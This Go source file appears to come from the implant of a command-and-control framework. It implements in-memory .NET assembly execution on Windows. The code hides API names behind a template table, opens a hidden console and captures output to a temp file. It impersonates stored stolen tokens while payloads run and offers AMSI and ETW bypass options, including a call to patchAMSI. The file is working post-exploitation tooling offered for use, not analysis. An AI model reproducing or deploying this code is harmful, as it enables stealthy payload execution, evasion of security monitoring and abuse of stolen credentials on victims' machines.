//go:build windows
// +build windows

package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	clr "github.com/almounah/go-buena-clr"
)

const (
	STD_OUTPUT_HANDLE = ^uintptr(10)
	STD_ERROR_HANDLE  = ^uintptr(11)
)

func iaDllKernel32() string { return iaTpl(idxIADllKernel32) }
func iaDllOle32() string    { return iaTpl(idxIADllOle32) }
func iaDllUser32() string   { return iaTpl(idxIADllUser32) }

func iaFnGetStdHandle() string          { return iaTpl(idxIAFnGetStdHandle) }
func iaFnSetStdHandle() string          { return iaTpl(idxIAFnSetStdHandle) }
func iaFnAllocConsole() string          { return iaTpl(idxIAFnAllocConsole) }
func iaFnFreeConsole() string           { return iaTpl(idxIAFnFreeConsole) }
func iaFnGetConsoleWindow() string      { return iaTpl(idxIAFnGetConsoleWindow) }
func iaFnCoInitializeEx() string        { return iaTpl(idxIAFnCoInitializeEx) }
func iaFnFlushInstructionCache() string { return iaTpl(idxIAFnFlushInstructionCache) }
func iaFnShowWindow() string            { return iaTpl(idxIAFnShowWindow) }

const (
	idxIAClrV4     = 400
	idxIAClrV2     = 401
	idxIAClrV2Full = 402

	idxIADllKernel32 = 800
	idxIADllOle32    = 801
	idxIADllUser32   = 802

	idxIAFnGetStdHandle          = 804
	idxIAFnSetStdHandle          = 805
	idxIAFnAllocConsole          = 806
	idxIAFnFreeConsole           = 807
	idxIAFnGetConsoleWindow      = 808
	idxIAFnCoInitializeEx        = 815
	idxIAFnFlushInstructionCache = 817
	idxIAFnShowWindow            = 818
	idxIAMethodSigNoArgs         = 844
)

var (
	iaTemplate   []string
	iaTemplateMu sync.RWMutex
)

func SetInlineAssemblyTemplate(templates []string) {
	iaTemplateMu.Lock()
	iaTemplate = templates
	iaTemplateMu.Unlock()
	initIAWindowsAPI()
	SetCLRTemplate(templates)
}

func iaTpl(idx int) string {
	iaTemplateMu.RLock()
	defer iaTemplateMu.RUnlock()
	if iaTemplate != nil && idx < len(iaTemplate) {
		return iaTemplate[idx]
	}
	return ""
}

func iaClrV4() string     { return iaTpl(idxIAClrV4) }
func iaClrV2() string     { return iaTpl(idxIAClrV2) }
func iaClrV2Full() string { return iaTpl(idxIAClrV2Full) }

var (
	kernel32DLL *syscall.LazyDLL
	ole32       *syscall.LazyDLL
	user32      *syscall.LazyDLL

	getStdHandle     *syscall.LazyProc
	setStdHandle     *syscall.LazyProc
	allocConsole     *syscall.LazyProc
	freeConsole      *syscall.LazyProc
	getConsoleWindow *syscall.LazyProc

	coInitializeEx        *syscall.LazyProc
	flushInstructionCache *syscall.LazyProc

	showWindow *syscall.LazyProc
)

var iaInitOnce sync.Once

func initIAWindowsAPI() {
	iaInitOnce.Do(func() {
		kernel32DLL = syscall.NewLazyDLL(iaDllKernel32())
		ole32 = syscall.NewLazyDLL(iaDllOle32())
		user32 = syscall.NewLazyDLL(iaDllUser32())

		getStdHandle = kernel32DLL.NewProc(iaFnGetStdHandle())
		setStdHandle = kernel32DLL.NewProc(iaFnSetStdHandle())
		allocConsole = kernel32DLL.NewProc(iaFnAllocConsole())
		freeConsole = kernel32DLL.NewProc(iaFnFreeConsole())
		getConsoleWindow = kernel32DLL.NewProc(iaFnGetConsoleWindow())

		coInitializeEx = ole32.NewProc(iaFnCoInitializeEx())
		flushInstructionCache = kernel32DLL.NewProc(iaFnFlushInstructionCache())

		showWindow = user32.NewProc(iaFnShowWindow())
	})
}

func applyTokenContextForInlineAssembly() func() {
	if globalTokenStore == nil {
		return func() {}
	}

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	var cleanupFunc func()

	if globalTokenStore.NetOnlyHandle != 0 {
		if err := ImpersonateLoggedOnUser(globalTokenStore.NetOnlyHandle); err == nil {
			cleanupFunc = func() { RevertToSelf() }
		}
	} else if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
		if token, exists := globalTokenStore.Tokens[globalTokenStore.ActiveToken]; exists {
			if err := ImpersonateLoggedOnUser(token); err == nil {
				cleanupFunc = func() { RevertToSelf() }
			}
		}
	}

	if cleanupFunc == nil {
		return func() {}
	}

	return cleanupFunc
}

type clrWorkRequest struct {
	assemblyBytes []byte
	arguments     []string
	targetRuntime string
	resultCh      chan clrWorkResult
}

type clrWorkResult struct {
	output   string
	exitCode int
	err      error
}

var (
	clrWorkerCh   chan clrWorkRequest
	clrWorkerOnce sync.Once
)

func ensureCLRWorker() {
	clrWorkerOnce.Do(func() {
		clrWorkerCh = make(chan clrWorkRequest, 4)
		go clrWorkerLoop()
	})
}

var (
	cachedRuntimeHost unsafe.Pointer
	cachedAppDomain   unsafe.Pointer
	captureFile       *os.File
	capturePath       string
)

func clrWorkerLoop() {
	runtime.LockOSThread()

	coInitializeEx.Call(0, 0)

	if wnd, _, _ := getConsoleWindow.Call(); wnd == 0 {
		if ret, _, _ := allocConsole.Call(); ret != 0 {
			if hwnd, _, _ := getConsoleWindow.Call(); hwnd != 0 {
				showWindow.Call(hwnd, 0)
			}
		}
	}

	if f, err := os.CreateTemp("", "t"); err == nil {
		captureFile = f
		capturePath = f.Name()
		setStdHandle.Call(STD_OUTPUT_HANDLE, captureFile.Fd())
		setStdHandle.Call(STD_ERROR_HANDLE, captureFile.Fd())
	}

	for req := range clrWorkerCh {
		result := processCLRWork(req)
		req.resultCh <- result
	}

	if captureFile != nil {
		captureFile.Close()
		os.Remove(capturePath)
	}
}

func processCLRWork(req clrWorkRequest) (result clrWorkResult) {
	defer func() {
		if r := recover(); r != nil {
			cachedRuntimeHost = nil
			cachedAppDomain = nil
			result = clrWorkResult{"", -1, fmt.Errorf(Err(E52))}
		}
	}()

	tokenCleanup := applyTokenContextForInlineAssembly()
	defer tokenCleanup()

	var appDomain *clr.AppDomain

	if cachedRuntimeHost == nil {
		host, err := clr.LoadCLR(req.targetRuntime)
		if err != nil {
			return clrWorkResult{"", -1, fmt.Errorf(Err(E52))}
		}
		cachedRuntimeHost = unsafe.Pointer(host)

		ad, domErr := clr.GetAppDomain(host)
		if domErr != nil {
			cachedRuntimeHost = nil
			return clrWorkResult{"", -1, fmt.Errorf(Err(E52))}
		}
		cachedAppDomain = unsafe.Pointer(ad)
		appDomain = ad
	} else {
		appDomain = (*clr.AppDomain)(cachedAppDomain)
	}

	safeArray, saErr := clr.CreateSafeArray(req.assemblyBytes)
	if saErr != nil {
		return clrWorkResult{"", -1, fmt.Errorf(Err(E52))}
	}

	assembly, loadErr := appDomain.Load_3(safeArray)
	if loadErr != nil {
		return clrWorkResult{"", -1, loadErr}
	}
	defer assembly.Release()

	methodInfo, epErr := assembly.GetEntryPoint()
	if epErr != nil {
		return clrWorkResult{"", -1, epErr}
	}

	methodSig, _ := methodInfo.GetString()
	var paramSafeArray *clr.SafeArray
	if !strings.Contains(methodSig, iaTpl(idxIAMethodSigNoArgs)) {
		paramSafeArray, _ = clr.PrepareParameters(req.arguments)
	}

	if captureFile != nil {
		captureFile.Truncate(0)
		captureFile.Seek(0, io.SeekStart)
	}

	nullVariant := clr.Variant{VT: 1, Val: uintptr(0)}
	execErr := methodInfo.Invoke_3(nullVariant, paramSafeArray)

	if paramSafeArray != nil {
		clr.SafeArrayDestroy(paramSafeArray)
	}

	var output string
	if captureFile != nil {
		captureFile.Seek(0, io.SeekStart)
		capturedBytes, _ := io.ReadAll(captureFile)
		output = string(capturedBytes)
	}

	return clrWorkResult{output, 0, execErr}
}

func executeCLRWithCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
	targetRuntime := iaClrV4()
	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
		targetRuntime = iaClrV2()
	}

	ensureCLRWorker()

	resultCh := make(chan clrWorkResult, 1)
	clrWorkerCh <- clrWorkRequest{
		assemblyBytes: assemblyBytes,
		arguments:     arguments,
		targetRuntime: targetRuntime,
		resultCh:      resultCh,
	}

	select {
	case res := <-resultCh:
		exitCode := res.exitCode
		if res.err != nil && exitCode == 0 && res.output == "" {
			exitCode = -1
		}
		return res.output, exitCode, res.err
	case <-time.After(120 * time.Second):
		return "", -1, fmt.Errorf(Err(E9))
	}
}

func (c *InlineAssemblyCommand) executeWindowsAssembly(assemblyBytes []byte, config struct {
	AssemblyB64 string   `json:"ab"`
	Arguments   []string `json:"ar"`
	AppDomain   string   `json:"ad"`
	BypassAMSI  bool     `json:"ba"`
	BypassETW   bool     `json:"be"`
	RevertETW   bool     `json:"re"`
	EntryPoint  string   `json:"ep"`
	UsePipe     bool     `json:"up"`
	PipeName    string   `json:"pm"`
}, executionNumber int) (string, int) {
	var output strings.Builder

	if config.BypassAMSI {
		patchAMSI()
	}

	assemblyOutput, exitCode, err := executeCLRWithCapture(assemblyBytes, config.Arguments)

	if assemblyOutput != "" {
		output.WriteString("\n")
		output.WriteString(assemblyOutput)
		if !strings.HasSuffix(assemblyOutput, "\n") {
			output.WriteString("\n")
		}
	} else if err != nil {
		errMsg := err.Error()
		if errMsg == Err(E53) || errMsg == Err(E9) {
			output.WriteString("\n" + errMsg + "\n")
		} else {
			output.WriteString("\n" + Err(E52) + "\n")
		}
	} else {
		output.WriteString(Succ(S18) + "\n")
	}

	return output.String(), exitCode
}
